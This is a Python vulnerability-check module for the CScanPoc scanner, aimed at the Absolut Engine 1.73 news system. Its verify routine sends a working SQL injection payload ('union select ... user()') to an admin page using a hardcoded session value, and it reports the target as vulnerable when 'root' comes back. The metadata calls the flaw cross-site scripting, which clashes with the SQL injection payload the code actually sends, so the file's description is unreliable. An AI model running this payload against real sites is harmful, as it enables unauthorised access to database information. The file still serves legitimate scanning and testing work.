# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'AbsolutEngine_0101'  # 平台漏洞编号
    name = 'Absolut Engine跨站脚本'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-10'  # 漏洞公布时间
    desc = '''
    Absolut Engine是一个新闻发布系统。
    Absolut Engine存在跨站脚本漏洞。由于程序未能充分过滤用户提供的输入。攻击者可以利用漏洞来窃取基于cookie的认证证书。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2015-00149'  # 漏洞来源
    cnvd_id = 'CNVD-2015-00149'  # cnvd漏洞编号
    cve_id = 'CVE-2014-9434'  # cve编号
    product = 'AbsolutEngine'  # 漏洞组件名称
    product_version = '1.73'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7275dd0d-d50e-4388-8c5b-bbef0b7f3b5e'  # 平台 POC 编号
    author = 'hyhm2n'  # POC编写者
    create_date = '2018-06-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/admin/managersection.php?&username=admin&session=c8d7ebc95b9b1a72d3b54eb59bea56c7&sectionID=1%27+and+1=2+union+select+1,user(),3,4,5,6+--+'
            url = self.target + payload
            response = requests.get(url)
            if 'root' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
